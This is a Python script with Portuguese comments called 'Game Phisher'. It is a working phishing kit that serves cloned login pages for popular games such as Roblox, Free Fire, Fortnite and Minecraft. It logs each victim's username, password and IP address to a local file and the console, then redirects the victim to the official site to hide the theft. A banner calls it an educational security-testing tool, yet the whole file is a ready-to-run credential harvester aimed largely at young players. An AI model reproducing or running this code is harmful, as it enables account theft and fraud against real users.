#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import threading
import http.server
import socketserver
import json
import time
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# Configurações
PORT = 8080
HOST = "0.0.0.0"
DATA_FILE = "captured_data.txt"
LOG_FILE = "server.log"

# Cores para output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Template base HTML
BASE_HTML = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }}
        
        body {{
            background: {background};
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .login-container {{
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            width: 100%;
            max-width: 400px;
        }}
        
        .game-logo {{
            text-align: center;
            margin-bottom: 20px;
        }}
        
        .game-logo h1 {{
            font-size: 28px;
            margin-bottom: 10px;
            color: {accent_color};
        }}
        
        .game-logo img {{
            max-width: 100px;
            margin-bottom: 15px;
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        .form-group label {{
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }}
        
        .form-group input {{
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }}
        
        .form-group input:focus {{
            outline: none;
            border-color: {accent_color};
        }}
        
        .btn {{
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            background: {accent_color};
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }}
        
        .btn:hover {{
            background: {hover_color};
        }}
        
        .footer {{
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.6);
        }}
        
        .error-message {{
            color: #ff4444;
            text-align: center;
            margin-top: 10px;
            display: none;
        }}
        
        .success-message {{
            color: #00C851;
            text-align: center;
            margin-top: 10px;
            display: none;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="game-logo">
            <h1>{game_name}</h1>
            <p>Faça login para continuar jogando</p>
        </div>
        
        <form id="loginForm" method="POST">
            <div class="form-group">
                <label for="username">Usuário ou E-mail</label>
                <input type="text" id="username" name="username" required placeholder="Seu usuário ou e-mail">
            </div>
            
            <div class="form-group">
                <label for="password">Senha</label>
                <input type="password" id="password" name="password" required placeholder="Sua senha">
            </div>
            
            <button type="submit" class="btn">Entrar</button>
        </form>
        
        <div class="error-message" id="errorMessage">
            Usuário ou senha incorretos. Tente novamente.
        </div>
        
        <div class="success-message" id="successMessage">
            Login realizado com sucesso! Redirecionando...
        </div>
        
        <div class="footer">
            <p>Problemas para entrar? <a href="#" style="color: {accent_color}">Clique aqui</a></p>
            <p>© {current_year} {game_name}. Todos os direitos reservados.</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            // Mostrar mensagem de sucesso
            document.getElementById('successMessage').style.display = 'block';
            document.getElementById('errorMessage').style.display = 'none';
            
            // Simular processo de login
            setTimeout(function() {{
                document.getElementById('loginForm').submit();
            }}, 2000);
        }});
    </script>
</body>
</html>
"""

# Templates específicos para cada jogo
GAME_TEMPLATES = {
    "freefire": {
        "title": "Free Fire - Login",
        "game_name": "Free Fire",
        "background": "linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d)",
        "accent_color": "#FF8C00",
        "hover_color": "#FF6A00",
        "path": "/freefire"
    },
    "roblox": {
        "title": "Roblox - Login",
        "game_name": "Roblox",
        "background": "linear-gradient(135deg, #0f4c75, #3282b8, #bbe1fa)",
        "accent_color": "#FF6B6B",
        "hover_color": "#EE5A52",
        "path": "/roblox"
    },
    "fortnite": {
        "title": "Fortnite - Login",
        "game_name": "Fortnite",
        "background": "linear-gradient(135deg, #141E30, #243B55)",
        "accent_color": "#7B68EE",
        "hover_color": "#6A5ACD",
        "path": "/fortnite"
    },
    "pubg": {
        "title": "PUBG - Login",
        "game_name": "PUBG Mobile",
        "background": "linear-gradient(135deg, #2c3e50, #4ca1af)",
        "accent_color": "#E74C3C",
        "hover_color": "#C0392B",
        "path": "/pubg"
    },
    "clashroyale": {
        "title": "Clash Royale - Login",
        "game_name": "Clash Royale",
        "background": "linear-gradient(135deg, #8E2DE2, #4A00E0)",
        "accent_color": "#FFD700",
        "hover_color": "#FFA500",
        "path": "/clashroyale"
    },
    "clashofclans": {
        "title": "Clash of Clans - Login",
        "game_name": "Clash of Clans",
        "background": "linear-gradient(135deg, #3a7bd5, #00d2ff)",
        "accent_color": "#FFA500",
        "hover_color": "#FF8C00",
        "path": "/clashofclans"
    },
    "minecraft": {
        "title": "Minecraft - Login",
        "game_name": "Minecraft",
        "background": "linear-gradient(135deg, #0f9b0f, #3cba54)",
        "accent_color": "#8B4513",
        "hover_color": "#A0522D",
        "path": "/minecraft"
    },
    "amongus": {
        "title": "Among Us - Login",
        "game_name": "Among Us",
        "background": "linear-gradient(135deg, #1a1a2e, #16213e, #0f3460)",
        "accent_color": "#FF5252",
        "hover_color": "#FF1744",
        "path": "/amongus"
    }
}

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Log da requisição
        self.log_request()
        
        # Verificar se a rota corresponde a algum jogo
        for game, config in GAME_TEMPLATES.items():
            if self.path == config["path"] or self.path == config["path"] + "/":
                self.send_login_page(game)
                return
                
        # Página inicial com lista de jogos
        if self.path == "/":
            self.send_index_page()
            return
            
        # Servir arquivos estáticos se existirem
        if self.path.endswith('.css') or self.path.endswith('.js') or self.path.endswith('.png') or self.path.endswith('.jpg'):
            super().do_GET()
            return
            
        # Página não encontrada
        self.send_error(404, "Página não encontrada")
        
    def do_POST(self):
        # Processar dados de login
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = parse_qs(post_data)
        
        # Extrair username e password
        username = form_data.get('username', [''])[0]
        password = form_data.get('password', [''])[0]
        
        # Determinar de qual jogo veio o login
        game = "unknown"
        for g, config in GAME_TEMPLATES.items():
            if self.path == config["path"]:
                game = g
                break
                
        # Salvar dados
        self.save_credentials(game, username, password)
        
        # Redirecionar para página oficial do jogo
        redirect_url = self.get_redirect_url(game)
        self.send_response(302)
        self.send_header('Location', redirect_url)
        self.end_headers()
        
    def send_login_page(self, game):
        if game not in GAME_TEMPLATES:
            self.send_error(404, "Jogo não encontrado")
            return
            
        config = GAME_TEMPLATES[game]
        current_year = datetime.now().year
        
        # Gerar HTML personalizado
        html_content = BASE_HTML.format(
            title=config["title"],
            game_name=config["game_name"],
            background=config["background"],
            accent_color=config["accent_color"],
            hover_color=config["hover_color"],
            current_year=current_year
        )
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
        
    def send_index_page(self):
        html_content = """
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Game Center</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #667eea, #764ba2);
                    color: #fff;
                    min-height: 100vh;
                    padding: 40px 20px;
                }
                
                .container {
                    max-width: 1000px;
                    margin: 0 auto;
                }
                
                header {
                    text-align: center;
                    margin-bottom: 40px;
                }
                
                header h1 {
                    font-size: 36px;
                    margin-bottom: 10px;
                }
                
                header p {
                    font-size: 18px;
                    opacity: 0.8;
                }
                
                .games-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
                    gap: 20px;
                }
                
                .game-card {
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 10px;
                    padding: 20px;
                    text-align: center;
                    transition: transform 0.3s, box-shadow 0.3s;
                    cursor: pointer;
                }
                
                .game-card:hover {
                    transform: translateY(-5px);
                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
                    background: rgba(255, 255, 255, 0.15);
                }
                
                .game-card h2 {
                    margin: 15px 0;
                    font-size: 20px;
                }
                
                .game-card a {
                    display: inline-block;
                    padding: 10px 20px;
                    background: #fff;
                    color: #333;
                    text-decoration: none;
                    border-radius: 5px;
                    font-weight: bold;
                    transition: background 0.3s;
                }
                
                .game-card a:hover {
                    background: #eee;
                }
                
                footer {
                    text-align: center;
                    margin-top: 50px;
                    opacity: 0.7;
                    font-size: 14px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <header>
                    <h1>Game Center</h1>
                    <p>Selecione um jogo para fazer login</p>
                </header>
                
                <div class="games-grid">
        """
        
        # Adicionar cards para cada jogo
        for game, config in GAME_TEMPLATES.items():
            html_content += f"""
                    <div class="game-card">
                        <h2>{config['game_name']}</h2>
                        <a href="{config['path']}">Fazer Login</a>
                    </div>
            """
        
        html_content += """
                </div>
                
                <footer>
                    <p>© 2023 Game Center. Todos os direitos reservados.</p>
                </footer>
            </div>
        </body>
        </html>
        """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
        
    def save_credentials(self, game, username, password):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = self.client_address[0]
        
        data = f"[{timestamp}] [{ip_address}] [{game}] Usuário: {username} | Senha: {password}\n"
        
        # Salvar em arquivo
        with open(DATA_FILE, "a", encoding="utf-8") as f:
            f.write(data)
            
        # Log no console
        print(f"{Colors.GREEN}[+] {Colors.RESET}Credenciais capturadas - {game}: {username}:{password}")
        
    def get_redirect_url(self, game):
        # URLs oficiais de redirecionamento para cada jogo
        redirect_urls = {
            "freefire": "https://ff.garena.com/",
            "roblox": "https://www.roblox.com/",
            "fortnite": "https://www.epicgames.com/fortnite/",
            "pubg": "https://pubgmobile.com/",
            "clashroyale": "https://clashroyale.com/",
            "clashofclans": "https://clashofclans.com/",
            "minecraft": "https://www.minecraft.net/",
            "amongus": "https://www.innersloth.com/games/among-us/",
            "unknown": "https://www.google.com/"
        }
        
        return redirect_urls.get(game, redirect_urls["unknown"])
        
    def log_message(self, format, *args):
        # Personalizar logs
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = format % args
        log_entry = f"[{timestamp}] {message}\n"
        
        # Salvar log em arquivo
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
            
        # Exibir log colorido no console
        if "200" in message:
            color = Colors.GREEN
        elif "302" in message:
            color = Colors.CYAN
        elif "404" in message:
            color = Colors.RED
        else:
            color = Colors.YELLOW
            
        print(f"{color}[{timestamp}] {message}{Colors.RESET}")

class GamePhisher:
    def __init__(self):
        self.host = HOST
        self.port = PORT
        self.httpd = None
        
    def start_server(self):
        try:
            with socketserver.TCPServer((self.host, self.port), PhishingHandler) as httpd:
                self.httpd = httpd
                print(f"{Colors.GREEN}[+] {Colors.RESET}Servidor iniciado em http://{self.host}:{self.port}")
                print(f"{Colors.GREEN}[+] {Colors.RESET}Páginas disponíveis:")
                
                for game, config in GAME_TEMPLATES.items():
                    print(f"{Colors.BLUE}    {config['path']} {Colors.RESET}- {config['game_name']}")
                
                print(f"\n{Colors.YELLOW}[!] {Colors.RESET}Pressione Ctrl+C para parar o servidor")
                
                try:
                    httpd.serve_forever()
                except KeyboardInterrupt:
                    print(f"\n{Colors.RED}[-] {Colors.RESET}Parando servidor...")
                    
        except Exception as e:
            print(f"{Colors.RED}[-] {Colors.RESET}Erro ao iniciar servidor: {e}")
            
    def get_local_ip(self):
        try:
            # Obter IP local
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
            
    def get_public_ip(self):
        try:
            # Tentar obter IP público
            import requests
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Não disponível"

def main():
    print(f"""{Colors.PURPLE}
    ██████╗  █████╗ ███╗   ███╗███████╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
    ██╔════╝ ██╔══██╗████╗ ████║██╔════╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
    ██║  ███╗███████║██╔████╔██║█████╗      ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
    ██║   ██║██╔══██║██║╚██╔╝██║██╔══╝      ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
    ╚██████╔╝██║  ██║██║ ╚═╝ ██║███████╗    ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
    {Colors.RESET}""")
    
    print(f"{Colors.CYAN}    Game Phisher - Ferramenta educacional para testes de segurança{Colors.RESET}\n")
    
    # Verificar se é root (para portas baixas)
    if os.geteuid() == 0 and PORT < 1024:
        print(f"{Colors.YELLOW}[!] {Colors.RESET}Executando como root para usar porta {PORT}")
    else:
        if PORT < 1024 and os.geteuid() != 0:
            print(f"{Colors.RED}[-] {Colors.RESET}Portas abaixo de 1024 requerem privilégios de root")
            sys.exit(1)
    
    # Mostrar informações de rede
    phisher = GamePhisher()
    local_ip = phisher.get_local_ip()
    public_ip = phisher.get_public_ip()
    
    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Local: {local_ip}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Público: {public_ip}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Porta: {PORT}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Arquivo de dados: {DATA_FILE}\n")
    
    # Iniciar servidor
    phisher.start_server()

if __name__ == "__main__":
    main()
